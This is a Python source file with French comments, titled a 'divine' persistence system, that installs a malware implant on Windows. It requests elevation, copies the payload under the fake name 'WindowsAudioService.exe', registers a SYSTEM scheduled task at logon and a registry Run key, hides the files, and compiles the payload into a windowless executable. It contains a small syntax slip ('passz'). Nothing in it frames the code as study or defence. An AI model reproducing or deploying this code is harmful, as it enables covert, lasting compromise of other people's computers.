# persistence.py
# Le Système de Persistence Divin - Invisible, Immuable, Imparable

import os
import sys
import ctypes
import winreg
import shutil
import subprocess
import tempfile
from pathlib import Path

class DivinePersistence:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.target_name = "WindowsAudioService.exe"
        self.target_path = os.path.join(self.appdata, "Microsoft", "Audio", "Drivers", self.target_name)
        
    def is_admin(self):
        """Vérifie les privilèges d'administrateur"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def elevate_privileges(self):
        """Élève les privilèges si nécessaire"""
        if not self.is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    
    def create_persistent_service(self, payload_path):
        """Crée un service Windows légitime pour l'implant"""
        service_name = "WindowsAudioEnhancement"
        service_display = "Windows Audio Enhancement Service"
        
        # Copier le payload comme service système
        os.makedirs(os.path.dirname(self.target_path), exist_ok=True)
        shutil.copy2(payload_path, self.target_path)
        
        # Créer un fichier de service .bat pour le lancement
        service_bat = f'''@echo off
:start
"{self.target_path}"
timeout /t 30 /nobreak
goto start
'''
        
        bat_path = os.path.join(os.path.dirname(self.target_path), "service_launcher.bat")
        with open(bat_path, 'w') as f:
            f.write(service_bat)
        
        # Créer une tâche planifiée (plus fiable que Run)
        task_command = (
            f'schtasks /create /tn "{service_name}" /tr "{bat_path}" '
            f'/sc onlogon /ru SYSTEM /rl highest /f'
        )
        subprocess.run(task_command, shell=True, capture_output=True)
        
        # Ajouter aussi au registre pour redondance
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "AudioService", 0, winreg.REG_SZ, f'"{bat_path}"')
            winreg.CloseKey(key)
        except:
            pass
        
        # Masquer les fichiers
        for file_path in [self.target_path, bat_path]:
            subprocess.run(f'attrib +h +s "{file_path}"', shell=True)
    
    def install_payload(self, payload_code):
        """Installe le payload comme exécutable autonome"""
        # Convertir le code Python en exécutable avec PyInstaller embarqué
        temp_dir = tempfile.mkdtemp()
        
        # Écrire le payload
        payload_file = os.path.join(temp_dir, "payload_compiled.py")
        with open(payload_file, 'w') as f:
            f.write(payload_code)
        
        # Créer un exécutable autonome
        pyinstaller_cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            f"--name={self.target_name.replace('.exe', '')}",
            payload_file
        ]
        
        try:
            subprocess.run(pyinstaller_cmd, cwd=temp_dir, capture_output=True)
            
            # Récupérer l'exécutable compilé
            compiled_exe = os.path.join(temp_dir, "dist", self.target_name)
            if os.path.exists(compiled_exe):
                self.create_persistent_service(compiled_exe)
                return True
        except:
            passz
        
        return False

def install_divine_implant():
    """Fonction principale d'installation de l'implant"""
    persister = DivinePersistence()
    persister.elevate_privileges()
    
    # Code du payload (sera injecté dynamiquement)
    with open(__file__, 'r') as f:
        payload_base = f.read()
    
    return persister.install_payload(payload_base)